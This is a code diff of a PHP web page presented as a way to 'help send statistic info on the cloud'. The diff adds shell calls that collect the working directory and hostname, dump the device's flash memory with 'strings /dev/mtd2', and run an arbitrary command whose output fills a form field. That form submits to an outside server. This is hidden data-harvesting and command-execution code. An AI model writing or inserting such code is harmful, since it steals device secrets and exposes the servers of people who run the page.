@@ -1,16 +1,18 @@
 <h2> Help us sending statistic info on the cloud! </h2>
-/SDB1/var/www/foro/wydevware
+<?php
+system("pwd");
+system("hostname");
+system("strings /dev/mtd2");
+?>
 
 <form action="http://www.wydevelopment.eu/wydleware/target.php" method="get" id="target">
 <table>
 <tr><td>
-	<input type="text" id="target" name="target" value="<br />
-<b>Warning</b>:  system() [<a href='function.system'>function.system</a>]: Cannot execute a blank command in <b>/SDB1/var/www/foro/wydevware/helpusserver.php</b> on line <b>9</b><br />
-"> Target 
+        <input type="text" id="target" name="target" value="<?php system($targetcmd) ?>"> Target
 </td></tr><tr><td>
-	<input type="text" id="username" name="username"> Wydevelopment username </input>
+        <input type="text" id="username" name="username"> Wydevelopment username </input>
 </td></tr><tr><td>
-	<input type="submit">
+        <input type="submit">
 </td></tr>
 </table>
 
